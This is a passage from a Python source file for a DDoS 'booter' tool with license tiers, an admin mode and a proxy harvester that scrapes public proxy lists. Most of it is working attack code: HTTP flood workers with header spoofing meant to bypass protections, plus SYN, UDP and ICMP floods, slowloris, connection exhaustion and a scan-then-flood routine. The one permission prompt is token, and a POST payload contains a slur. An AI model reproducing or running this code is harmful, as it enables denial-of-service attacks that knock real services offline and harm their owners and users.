        'Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.93 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 6.1; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 8.0.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
        # ... (full list continues)
    ]
}

# ================== PROXY MANAGEMENT ==================
proxies_enabled = False
proxy_list = []                # list of validated proxy URLs
proxy_lock = asyncio.Lock()    # to safely update the list during attack
last_proxy_refresh = 0
PROXY_REFRESH_INTERVAL = 300   # seconds

def parse_proxy_line(line):
    """Parse a proxy line which can be:
       - ip:port
       - ip:port:username:password
       - protocol://user:pass@ip:port
    Returns a full proxy URL string.
    """
    line = line.strip()
    if not line:
        return None
    # Already has protocol?
    if line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return line
    # Check for ip:port:user:pass format
    parts = line.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    else:
        return None

def load_proxies(file_path="proxies.txt"):
    global proxy_list
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
        new_proxies = []
        for line in lines:
            url = parse_proxy_line(line)
            if url:
                new_proxies.append(url)
        proxy_list = new_proxies
        print(f"  Loaded {len(proxy_list)} proxies from {file_path}")
    except FileNotFoundError:
        print(f"  {file_path} not found. Using no proxies.")
        proxy_list = []
    except Exception as e:
        print(f"  Error loading proxies: {e}")
        proxy_list = []

async def fetch_proxies_from_source(source_url, proxy_type='http'):
    """Fetch proxies from a given source URL with timeout."""
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(source_url) as resp:
                if resp.status != 200:
                    return []
                text = await resp.text()
                lines = text.strip().split('\n')
                proxies = []
                for line in lines:
                    line = line.strip()
                    if re.match(r'\d+\.\d+\.\d+\.\d+:\d+', line):
                        proxies.append(f"{proxy_type}://{line}")
                return proxies
    except:
        return []

async def fetch_proxies_from_multiple_sources():
    """Gather proxies from various public sources with concurrency limit."""
    sources = [
        ('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all', 'http'),
        ('https://www.proxy-list.download/api/v1/get?type=http', 'http'),
        ('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt', 'http'),
        ('https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt', 'http'),
        ('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt', 'http'),
        ('https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list-data.txt', 'http'),
    ]
    tasks = [fetch_proxies_from_source(url, ptype) for url, ptype in sources]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    all_proxies = []
    for res in results:
        if isinstance(res, list):
            all_proxies.extend(res)
    return list(set(all_proxies))

async def refresh_proxy_list(force=False):
    """Fetch and update proxy list in background."""
    global proxy_list, last_proxy_refresh
    now = time.time()
    if not force and (now - last_proxy_refresh) < PROXY_REFRESH_INTERVAL:
        return
    print(f"{current_color}[*] Refreshing proxy list in background...{RESET}")
    raw_proxies = await fetch_proxies_from_multiple_sources()
    if raw_proxies:
        async with proxy_lock:
            proxy_list = raw_proxies
            last_proxy_refresh = now
        print(f"{current_color}[+] Proxy list updated: {len(proxy_list)} proxies.{RESET}")
    else:
        print(f"{current_color}[!] No proxies fetched, keeping old list ({len(proxy_list)} proxies).{RESET}")

def get_random_proxy():
    if proxy_list:
        return random.choice(proxy_list)
    return None

# ================== USER AGENT & BYPASS UTILS ==================
def get_random_user_agent():
    return random.choice(USER_AGENTS['user_agents'])

def c(text):
    return f"{current_color}{text}{RESET}"

def clear_screen():
    print("\033[H\033[J", end="")
    sys.stdout.flush()
    print("\033[2J\033[H", end="")
    sys.stdout.flush()

def header():
    clear_screen()
    plan_info = PLANS[current_license['plan']]
    admin_indicator = " [ADMIN]" if admin_mode else ""
    
    print(f"""
{current_color}{BOLD}
{ASCII_MENUS[current_ascii]}
  Made by: bob
{RESET}
{current_color} User: {plan_info['name']}{admin_indicator} •{RESET}
{current_color}
  ┌────────────────────────────────────┐
  │ [1] Launch Attack                  │
  │ [2] Methods+                       │
  │ [3] Color Schemes                  │
  │ [4] View Workers                   │
  │ [5] Plans+                         │
  │ [6] Change ASCII Menu              │
  │ [7] Refresh                        │
  │ [8] Proxy Settings                  │
  │ [9] Admin Panel                     │
  │ [10] Reconnaissance                 │
  │ [0] Exit                           │
  └────────────────────────────────────┘
{RESET}""")

# Stats structure (now thread-safe for Layer 4)
stats = {
    "start_time": 0.0,
    "requests": 0,          # packets sent
    "errors": 0,
    "latencies": [],        # not used for L4
    "status_codes": Counter(), # not used for L4
    "running": False,
    "active_agents": [],
    "connections": 0,        # for TCP connection tracking
    "ports_hit": set(),      # for port scan
}
stats_lock = threading.Lock()

def generate_random_path(base_url):
    paths = ['/api', '/v1', '/data', '/stats', '/images', '/css', '/js', '/admin', '/login', '/wp-admin', '/wp-content', '/assets', '/public']
    extensions = ['', '.php', '.asp', '.jsp', '.html', '.htm', '.aspx']
    path = random.choice(paths) + random.choice(extensions) if random.random() > 0.3 else ''
    query = f"?{random.randint(1000,9999)}={random.randint(1,100)}&_={int(time.time())}" if random.random() > 0.5 else ''
    return base_url.rstrip('/') + path + query

def generate_random_headers():
    headers = {
        'Accept': random.choice(['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json, text/plain, */*', 'image/webp,*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.7']),
        'Referer': random.choice(['https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/', 'https://duckduckgo.com/', '']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }
    return headers

# ================== LAYER 7 WORKER ==================
async def http_worker(session, url, end_time, worker_id, method):
    user_agent = get_random_user_agent()
    with stats_lock:
        stats["active_agents"].append({
            'id': worker_id,
            'device': 'unknown',
            'agent': user_agent
        })
    
    headers = {'User-Agent': user_agent}
    
    if method in ['BROWSER', 'HULK']:
        headers.update({
            'X-Test-ID': f'worker-{worker_id}',
            'X-Load-Test': 'true'
        })
    
    if method in ['BYPASS-GET', 'BYPASS-POST', 'RANDOM-PATH']:
        headers.update(generate_random_headers())
    
    while stats["running"] and time.time() < end_time:
        try:
            start = time.perf_counter()
            
            # Choose proxy if enabled
            proxy = None
            if proxies_enabled:
                async with proxy_lock:
                    if proxy_list:
                        proxy = random.choice(proxy_list)
            
            # Build request URL with optional random path
            request_url = url
            if method in ['RANDOM-PATH', 'BYPASS-GET', 'BYPASS-POST']:
                request_url = generate_random_path(url)
            
            # Perform request based on method
            if method == 'HTTP GET':
                async with session.get(request_url.replace('https://', 'http://'), headers=headers, timeout=10, proxy=proxy) as resp:
                    await resp.read()
            elif method == 'HTTPS GET':
                async with session.get(request_url if request_url.startswith('https') else request_url.replace('http://', 'https://'), headers=headers, timeout=10, proxy=proxy) as resp:
                    await resp.read()
            elif method in ['HTTP POST', 'HTTPS POST', 'BYPASS-POST']:
                post_url = request_url
                if method == 'HTTP POST':
                    post_url = request_url.replace('https://', 'http://')
                data = {'niggadih': 'cumdata', 'bot_id': worker_id, 'timestamp': time.time()}
                if method == 'BYPASS-POST':
                    data['rand'] = random.randint(1,1000000)
                    data['session'] = ''.join(random.choices('abcdef0123456789', k=16))
                async with session.post(post_url, headers=headers, json=data, timeout=10, proxy=proxy) as resp:
                    await resp.read()
            elif method == 'CURL':
                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                    await resp.read()
            elif method == 'GET/POST MIX':
                if random.random() > 0.5:
                    async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                        await resp.read()
                else:
                    data = {'test': 'data', 'worker_id': worker_id}
                    async with session.post(request_url, headers=headers, json=data, timeout=10, proxy=proxy) as resp:
                        await resp.read()
            elif method in ['BROWSER', 'HULK']:
                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                    await resp.read()
            elif method == 'DNS-AMP':
                async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                    await resp.read()
            elif method == 'STRESS TEST':
                for _ in range(50):
                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                        await resp.read()
                        with stats_lock:
                            stats["requests"] += 1
                            stats["status_codes"][resp.status] += 1
                continue  # skip the single increment below
            elif method == 'TLS-VIP':
                for _ in range(5):
                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                        await resp.read()
                        with stats_lock:
                            stats["requests"] += 1
                            stats["status_codes"][resp.status] += 1
                continue
            elif method == 'CONCURRENT HOLD':
                for _ in range(99):
                    if random.random() > 0.5:
                        async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                            await resp.read()
                    else:
                        async with session.post(request_url, headers=headers, json={'data': 'test'}, timeout=8, proxy=proxy) as resp:
                            await resp.read()
                    with stats_lock:
                        stats["requests"] += 1
                        stats["status_codes"][resp.status] += 1
                continue
            elif method == 'SOCKET-AMP':
                for _ in range(5):
                    async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                        await resp.read()
                        with stats_lock:
                            stats["requests"] += 1
                            stats["status_codes"][resp.status] += 1
                continue
            elif method == 'NET-BYPASS':
                for _ in range(100):
                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                        await resp.read()
                        with stats_lock:
                            stats["requests"] += 1
                            stats["status_codes"][resp.status] += 1
                continue
            elif method == 'BYPASS-GET':
                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                    await resp.read()
            # For all single-request methods, update stats
            latency = time.perf_counter() - start
            with stats_lock:
                stats["latencies"].append(latency)
                stats["status_codes"][resp.status] += 1
                stats["requests"] += 1
                    
        except Exception:
            with stats_lock:
                stats["errors"] += 1

        # Rate limiting based on method
        if method in ['DNS-AMP', 'STRESS TEST', 'TLS-VIP', 'CONCURRENT HOLD', 'SOCKET-AMP', 'NET-BYPASS']:
            await asyncio.sleep(random.uniform(0.1, 0.5))
        else:
            await asyncio.sleep(random.uniform(0.5, 2.0))

# ================== LAYER 4 WORKERS ==================
# These run in threads, not asyncio tasks.

def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time):
    """TCP SYN flood worker – sends raw SYN packets."""
    # Requires root and scapy or raw sockets.
    if not HAS_SCAPY:
        # Fallback to raw socket (not trivial for SYN)
        return
    from scapy.all import IP, TCP, send
    ip = IP(dst=target_ip)
    while stats["running"] and time.time() < end_time:
        try:
            # Random source port
            sport = random.randint(1024, 65535)
            packet = ip / TCP(sport=sport, dport=target_port, flags="S")
            send(packet, verbose=False)
            with stats_lock:
                stats["requests"] += 1
                stats["ports_hit"].add(target_port)
        except:
            with stats_lock:
                stats["errors"] += 1

def udp_flood_worker(target_ip, target_port, worker_id, end_time):
    """UDP flood worker – sends large UDP packets."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while stats["running"] and time.time() < end_time:
        try:
            # Random large payload
            payload = os.urandom(random.randint(1024, 1472))
            sock.sendto(payload, (target_ip, target_port))
            with stats_lock:
                stats["requests"] += 1
                stats["ports_hit"].add(target_port)
        except:
            with stats_lock:
                stats["errors"] += 1

def icmp_flood_worker(target_ip, worker_id, end_time):
    """ICMP flood worker – sends ping packets."""
    # Requires root
    if not HAS_SCAPY:
        return
    from scapy.all import IP, ICMP, send
    ip = IP(dst=target_ip)
    while stats["running"] and time.time() < end_time:
        try:
            packet = ip / ICMP()
            send(packet, verbose=False)
            with stats_lock:
                stats["requests"] += 1
        except:
            with stats_lock:
                stats["errors"] += 1

def slowloris_worker(target_ip, target_port, worker_id, end_time):
    """Slowloris – holds connections open with partial requests."""
    socks = []
    while stats["running"] and time.time() < end_time:
        try:
            # Create new connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target_ip, target_port))
            # Send partial request
            partial = f"GET /{os.urandom(16).hex()} HTTP/1.1\r\nHost: {target_ip}\r\n".encode()
            sock.send(partial)
            socks.append(sock)
            with stats_lock:
                stats["connections"] += 1
                stats["ports_hit"].add(target_port)
            # Keep alive by sending headers occasionally
            time.sleep(5)
            for s in socks[-50:]:  # keep last 50 alive
                try:
                    s.send(b"X-a: b\r\n")
                    with stats_lock:
                        stats["requests"] += 1
                except:
                    pass
        except:
            with stats_lock:
                stats["errors"] += 1
        time.sleep(0.1)

def connection_exhaustion_worker(target_ip, target_port, worker_id, end_time):
    """Open and hold TCP connections."""
    while stats["running"] and time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((target_ip, target_port))
            with stats_lock:
                stats["connections"] += 1
                stats["ports_hit"].add(target_port)
            # Keep alive by sending keepalive
            time.sleep(10)
            sock.close()
        except:
            with stats_lock:
                stats["errors"] += 1

def port_scan_worker(target_ip, worker_id, end_time):
    """Scan for open ports and attack them."""
    ports_to_scan = list(range(1, 1025))  # first 1024 ports
    random.shuffle(ports_to_scan)
    for port in ports_to_scan:
        if not stats["running"] or time.time() >= end_time:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                # Port open – attack it!
                with stats_lock:
                    stats["ports_hit"].add(port)
                # Send some garbage
                for _ in range(10):
                    try:
                        sock.send(os.urandom(1024))
                        with stats_lock:
                            stats["requests"] += 1
                    except:
                        break
            sock.close()
        except:
            pass

# ================== METHOD SELECTION ==================
def select_method():
    if admin_mode:
        available_methods = ALL_METHODS
        plan_name = "ADMIN"
    else:
        plan_info = PLANS[current_license['plan']]
        available_methods = plan_info['methods']
        plan_name = plan_info['name']
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══ SELECT ATTACK METHOD ══╗{RESET}\n")
    print(f"  Available methods for {plan_name}:\n")
    
    for idx, method in enumerate(available_methods, 1):
        desc = METHOD_DESCRIPTIONS.get(method, 'No description available.')
        print(f"{current_color}  {idx}) {RESET}{method}")
        print(f"      {desc}")
    
    print(f"\n{current_color}{BOLD}╚═══════════════════════════╝{RESET}")
    
    try:
        choice = int(input(f"\n  Select method (1-{len(available_methods)}) → "))
        if 1 <= choice <= len(available_methods):
            return available_methods[choice - 1]
        else:
            print(f"\n  Invalid selection, using default: {available_methods[0]}")
            time.sleep(1)
            return available_methods[0]
    except:
        print(f"\n  Invalid input, using default: {available_methods[0]}")
        time.sleep(1)
        return available_methods[0]

# ================== ATTACK LAUNCHERS ==================
async def run_layer7_attack(url, method, workers, duration, plan_name):
    """Run Layer 7 attack using asyncio workers."""
    connector = aiohttp.TCPConnector(limit=workers, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        end_time = time.time() + duration
        tasks = [
            asyncio.create_task(http_worker(session, url, end_time, i+1, method))
            for i in range(workers)
        ]

        # Background task to refresh proxies periodically
        async def proxy_refresher():
            while stats["running"]:
                await asyncio.sleep(PROXY_REFRESH_INTERVAL)
                if proxies_enabled:
                    await refresh_proxy_list()
        if proxies_enabled:
            asyncio.create_task(proxy_refresher())

        try:
            while stats["running"] and time.time() < end_time:
                elapsed = time.time() - stats["start_time"]
                with stats_lock:
                    rps = stats["requests"] / elapsed if elapsed > 0 else 0
                    avg_latency = 0
                    if stats["latencies"]:
                        avg_latency = sum(stats["latencies"]) / len(stats["latencies"]) * 1000
                    reqs = stats["requests"]
                    errs = stats["errors"]
                    codes = stats["status_codes"].most_common(5)

                clear_screen()
                print(f"{current_color}{BOLD}╔══ LAYER 7 ATTACK IN PROGRESS ══╗{RESET}\n")
                print(f"{current_color}  Plan: {RESET}{plan_name}")
                print(f"{current_color}  Method: {RESET}{method}")
                print(f"{current_color}  Target: {RESET}{url}")
                print(f"{current_color}  Workers: {RESET}{workers}")
                print(f"{current_color}  Time: {RESET}{elapsed:.1f}s / {duration}s")
                print(f"{current_color}  Proxies: {RESET}{'Enabled' if proxies_enabled else 'Disabled'}")
                if proxies_enabled:
                    async with proxy_lock:
                        print(f"{current_color}  Proxy count: {RESET}{len(proxy_list)}")
                print(f"\n{current_color}{BOLD}  Performance Metrics:{RESET}")
                print(f"    Requests: {reqs:,}")
                print(f"    Errors: {errs:,}")
                print(f"    RPS: {rps:.2f}")
                print(f"    Avg Latency: {avg_latency:.0f} ms")
                
                if codes:
                    print(f"\n{current_color}{BOLD}  Status Codes:{RESET}")
                    for code, count in codes:
                        print(f"    {code}: {count:,}")
                
                await asyncio.sleep(1)

        except KeyboardInterrupt:
            print(f"\n\n{current_color}attack interrupted.{RESET}")
        finally:
            stats["running"] = False
            await asyncio.gather(*tasks, return_exceptions=True)

async def run_layer4_attack(target_ip, method, workers, duration, plan_name):
    """Run Layer 4 attack using thread pool."""
    # Determine target ports (for methods that need them)
    target_ports = []
    if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
        port_input = input(f"  Target port(s) (e.g., 80,443, or range 1-1024) → ").strip()
        if '-' in port_input:
            start, end = map(int, port_input.split('-'))
            target_ports = list(range(start, end+1))
        elif ',' in port_input:
            target_ports = [int(p.strip()) for p in port_input.split(',')]
        else:
            target_ports = [int(port_input)]
    else:
        # For ICMP flood and port scan, port is not needed initially
        pass

    # Map method to worker function and arguments
    worker_func = None
    worker_args = []
    if method == 'TCP SYN FLOOD':
        worker_func = tcp_syn_flood_worker
        worker_args = (target_ip, target_ports[0])  # we'll cycle ports later if multiple
    elif method == 'UDP FLOOD':
        worker_func = udp_flood_worker
        worker_args = (target_ip, target_ports[0])
    elif method == 'ICMP FLOOD':
        worker_func = icmp_flood_worker
        worker_args = (target_ip,)
    elif method == 'SLOWLORIS':
        worker_func = slowloris_worker
        worker_args = (target_ip, target_ports[0])
    elif method == 'CONNECTION EXHAUSTION':
        worker_func = connection_exhaustion_worker
        worker_args = (target_ip, target_ports[0])
    elif method == 'PORT SCAN & ATTACK':
        worker_func = port_scan_worker
        worker_args = (target_ip,)

    if not worker_func:
        print("  Unknown Layer 4 method.")
        return

    end_time = time.time() + duration

    # For methods with multiple ports, we need to distribute workers across ports
    # Simple approach: if multiple ports, assign each worker a random port from the list.
    def worker_wrapper(worker_id):
        nonlocal target_ports
        while stats["running"] and time.time() < end_time:
            if target_ports:
                port = random.choice(target_ports) if target_ports else None
                # Call appropriate worker with the selected port
                if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
                    worker_func(target_ip, port, worker_id, end_time)
                elif method == 'ICMP FLOOD':
                    worker_func(target_ip, worker_id, end_time)
                elif method == 'PORT SCAN & ATTACK':
                    worker_func(target_ip, worker_id, end_time)
            else:
                # No ports needed
                worker_func(target_ip, worker_id, end_time)

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(worker_wrapper, i) for i in range(workers)]

        # Stats display loop
        try:
            while stats["running"] and time.time() < end_time:
                elapsed = time.time() - stats["start_time"]
                with stats_lock:
                    rps = stats["requests"] / elapsed if elapsed > 0 else 0
                    reqs = stats["requests"]
                    errs = stats["errors"]
                    conns = stats["connections"]
                    ports_hit = len(stats["ports_hit"])

                clear_screen()
                print(f"{current_color}{BOLD}╔══ LAYER 4 ATTACK IN PROGRESS ══╗{RESET}\n")
                print(f"{current_color}  Plan: {RESET}{plan_name}")
                print(f"{current_color}  Method: {RESET}{method}")
                print(f"{current_color}  Target: {RESET}{target_ip}")
                if target_ports:
                    print(f"{current_color}  Ports: {RESET}{target_ports[:5]}... ({len(target_ports)} total)")
                print(f"{current_color}  Workers: {RESET}{workers}")
                print(f"{current_color}  Time: {RESET}{elapsed:.1f}s / {duration}s")
                print(f"\n{current_color}{BOLD}  Performance Metrics:{RESET}")
                print(f"    Packets Sent: {reqs:,}")
                print(f"    Errors: {errs:,}")
                print(f"    PPS: {rps:.2f}")
                print(f"    Active Connections: {conns:,}")
                print(f"    Ports Hit: {ports_hit}")
                await asyncio.sleep(1)

        except KeyboardInterrupt:
            print(f"\n\n{current_color}attack interrupted.{RESET}")
        finally:
            stats["running"] = False
            # Wait for threads to finish
            for f in futures:
                f.cancel()

async def run_load_test():
    if admin_mode:
        max_workers = ADMIN_WORKERS
        max_duration = ADMIN_DURATION
        plan_name = "ADMIN"
    else:
        plan_info = PLANS[current_license['plan']]
        max_workers = plan_info['workers']
        max_duration = plan_info['duration']
        plan_name = plan_info['name']
    
    if datetime.now() > current_license['expires'] and not admin_mode:
        clear_screen()
        print(f"{current_color}{BOLD}╔══ LICENSE EXPIRED ══╗{RESET}")
        print(f"\n  Your license has expired!")
        print(f"  Please renew in 'Plan Management' menu.")
        input(f"\n  Press ENTER to return...")
        return
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══────☁︎────══╗{RESET}")

    target = input(f"  Target (URL for L7, IP for L4) → ").strip()
    if not target:
        print("  No target entered.")
        return

    consent = input(f"\n  Do you have permission to attack? (y/n) → ").strip().lower()
    if consent not in ['y', 'yes']:
        print(f"\n{current_color}Test cancelled.{RESET}")
        input(f"\n  Press ENTER to return...")
        return

    method = select_method()

    # Determine if it's Layer 4
    is_layer4 = method in LAYER4_METHODS

    if is_layer4:
        # Validate IP
        try:
            socket.inet_aton(target)
        except socket.error:
            print(f"\n  For Layer 4 attacks, target must be an IP address.")
            input(f"\n  Press ENTER to return...")
            return
        # Check root if needed
        if method in ['TCP SYN FLOOD', 'ICMP FLOOD'] and os.geteuid() != 0:
            print(f"\n  {method} requires root. Please run with sudo.")
            input(f"\n  Press ENTER to return...")
            return
        target_ip = target
        url = None
    else:
        # Layer 7: ensure URL has scheme
        if not target.startswith(('http://','https://')):
            target = 'https://' + target
        url = target
        target_ip = None

    try:
        workers = int(input(f"\n Concurrent workers (max {max_workers}) → ") or max_workers)
        workers = min(workers, max_workers)
    except:
        workers = min(10, max_workers)

    try:
        duration = int(input(f"  Duration in seconds (max {max_duration}) → ") or 60)
        duration = min(duration, max_duration)
    except:
        duration = min(60, max_duration)

    # Start proxy refresh in background if enabled (only for L7)
    if not is_layer4 and proxies_enabled:
        asyncio.create_task(refresh_proxy_list(force=True))

    print(f"\n{current_color}{BOLD}Starting attack...{RESET}")
    print(f"  Plan: {plan_name}")
    print(f"  Method: {method}")
    if is_layer4:
        print(f"  Target IP: {target_ip}")
    else:
        print(f"  Target URL: {url}")
    print(f"  Workers: {workers}")
    print(f"  Duration: {duration}s")
    if not is_layer4 and proxies_enabled:
        async with proxy_lock:
            print(f"  Proxies: Enabled ({len(proxy_list)} loaded initially)")
    elif is_layer4:
        print(f"  Proxies: Not used for Layer 4")
    else:
        print(f"  Proxies: Disabled")

    # Reset stats
    stats["start_time"] = time.time()
    stats["requests"] = 0
    stats["errors"] = 0
    stats["latencies"] = []
    stats["status_codes"] = Counter()
    stats["running"] = True
    stats["active_agents"] = []
    stats["connections"] = 0
    stats["ports_hit"] = set()

    if is_layer4:
        await run_layer4_attack(target_ip, method, workers, duration, plan_name)
    else:
        await run_layer7_attack(url, method, workers, duration, plan_name)

    # Attack finished
    elapsed = time.time() - stats["start_time"]
    with stats_lock:
        reqs = stats["requests"]
        errs = stats["errors"]
        conns = stats["connections"]
        ports_hit = stats["ports_hit"]

    print(f"\n{current_color}{BOLD}╔══ ATTACK OVER ══╗{RESET}")
    if is_layer4:
        print(f"  Total Packets: {reqs:,}")
        print(f"  Total Errors: {errs:,}")
        print(f"  Peak Connections: {conns:,}")
        print(f"  Ports Hit: {len(ports_hit)}")
        if ports_hit:
            print(f"  Ports: {sorted(ports_hit)}")
    else:
        print(f"  Total Requests: {reqs:,}")
        print(f"  Total Errors: {errs:,}")
    print(f"  Duration: {elapsed:.1f}s")
    print(f"  Average RPS: {reqs/elapsed:.2f}")
    
    input(f"\n  Press ENTER to return...")

def test_config_screen():
    if admin_mode:
        print(f"{current_color}{BOLD}╔══ ADMIN METHODS ══╗{RESET}\n")
        print("  All methods are available:\n")
        for method in ALL_METHODS:
            desc = METHOD_DESCRIPTIONS.get(method, '')
            print(f"  • {method}")
            if desc:
                print(f"      {desc}")
        input(f"\n  Press ENTER...")
        return

    plan_info = PLANS[current_license['plan']]
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══────☁︎────══╗{RESET}")
    print(f"\n{current_color}  Current Plan: {RESET}{plan_info['name']}")
    print(f"{current_color}  Max Workers: {RESET}{plan_info['workers']}")
    print(f"{current_color}  Max Duration: {RESET}{plan_info['duration']}s")
    print(f"\n{current_color}  Available Methods:{RESET}")
    for method in plan_info['methods']:
        desc = METHOD_DESCRIPTIONS.get(method, '')
        print(f"    • {method}")
        if desc:
            print(f"      {desc}")
    print(f"\n{current_color}  Features:{RESET}")
    print("    • Heavy Request flow")
    print("    • Strong connection flow")
    print("    • 500+ Powerful User-agents")
    print("    • 10+ Powerful methods") 
    print(f"{current_color}{BOLD}╚═══════════════════════════════╝{RESET}")
    input(f"\n  Press ENTER...")

def view_test_agents():
    clear_screen()
    print(f"{current_color}{BOLD}╔══────☁︎────══╗{RESET}\n")
    
    try:
        num_entries = int(input(f"  Number of agent entries to display → ") or 10)
        num_entries = min(num_entries, 100)
    except:
        num_entries = 10
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══────☁︎────══╗{RESET}\n")
    print(f"  Showing {num_entries} Workers:\n")
    
    for i in range(num_entries):
        user_agent = get_random_user_agent()
        entry_num = random.randint(1, 100)
        
        if 'Mobile' in user_agent:
            device_display = 'Mobile'
        elif 'iPad' in user_agent:
            device_display = 'iPad'
        elif 'Android' in user_agent:
            device_display = 'Android'
        elif 'iPhone' in user_agent:
            device_display = 'iPhone'
        elif 'Linux' in user_agent:
            device_display = 'Linux'
        elif 'Windows' in user_agent:
            device_display = 'Windows'
        elif 'Mac' in user_agent:
            device_display = 'macOS'
        else:
            device_display = 'Unknown'
        
        print(f"{current_color}  [{entry_num}] {RESET}{device_display}")
        print(f"         {user_agent[:80]}...")
        print()
    
    print(f"{current_color}{BOLD}╚═══════════════════════════════╝{RESET}")
    input(f"\n  Press ENTER...")

def plan_and_license():
    global current_license
    
    if admin_mode:
        print(f"{current_color}{BOLD}╔══ ADMIN MODE ══╗{RESET}")
        print("\n  In admin mode, plan limits are overridden.")
        print(f"  Max workers: {ADMIN_WORKERS}")
        print(f"  Max duration: {ADMIN_DURATION}s")
        input(f"\n  Press ENTER...")
        return
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══ PLAN MANAGEMENT ══╗{RESET}\n")
    
    plan_info = PLANS[current_license['plan']]
    days_left = (current_license['expires'] - datetime.now()).days
    
    print(f"{current_color}  Current:{RESET}")
    print(f"    Plan: {plan_info['name']}")
    print(f"    Expires: {current_license['expires'].strftime('%Y-%m-%d')} ({days_left} days left)")
    
    print(f"\n{current_color}{BOLD}  Available Plans:{RESET}\n")
    for plan_key, plan in PLANS.items():
        print(f"  • {plan['name']}")
        print(f"    Workers: {plan['workers']} | Duration: {plan['duration']}s")
        print(f"    Methods: {len(plan['methods'])}")
        print()
    
    print(f"{current_color}{BOLD}╚═══════════════════════════════╝{RESET}")
    
    change = input(f"\n  Enter code to change plan (or press ENTER to skip) → ").strip().lower()
    
    if change:
        found = False
        for plan_key, plan in PLANS.items():
            if change in plan['76034a9f5bef30b9dee701711d30bed6']:
                current_license['plan'] = plan_key
                current_license['code'] = change
                current_license['expires'] = datetime.now() + timedelta(days=365)
                print(f"\n  ✓ Plan activated: {plan['name']}")
                found = True
                time.sleep(2)
                break
        
        if not found:
            print(f"\n  ✗ Invalid code")
            time.sleep(2)
    
    input(f"\n  Press ENTER...")

def color_screen():
    global current_color, current_name

    clear_screen()
    print(f"{current_color}{BOLD}╔══ COLOR SCHEME SELECTOR ══╗{RESET}\n")
    for name, code in COLORS.items():
        print(f"  {code}█ {name.ljust(12)}{RESET}")
    print(f"\n{current_color}{BOLD}╚═══════════════════════════╝{RESET}")
    
    pick = input(f"\n  Enter color name → ").strip().lower()
    if pick in COLORS:
        current_color = COLORS[pick]
        current_name = pick.title()
        print(f"\n  Color changed to: {current_color}{current_name}{RESET}")
    else:
        print(f"\n  Color not found - keeping current.")

    input(f"\n  Press ENTER...")

def change_ascii_menu():
    global current_ascii
    
    clear_screen()
    print(f"{current_color}{BOLD}╔══ ASCII MENU SELECTOR ══╗{RESET}\n")
    
    menu_names = list(ASCII_MENUS.keys())
    for idx, name in enumerate(menu_names, 1):
        print(f"{current_color}  {idx}) {RESET}{name}")
    
    print(f"\n{current_color}{BOLD}╚═══════════════════════════╝{RESET}")
    
    try:
        choice = int(input(f"\n  Select ASCII menu (1-{len(menu_names)}) → "))
        if 1 <= choice <= len(menu_names):
            current_ascii = menu_names[choice - 1]
            print(f"\n  ✓ ASCII menu changed to: {current_ascii}")
            time.sleep(1.5)
        else:
            print(f"\n  Invalid selection")
            time.sleep(1)
    except:
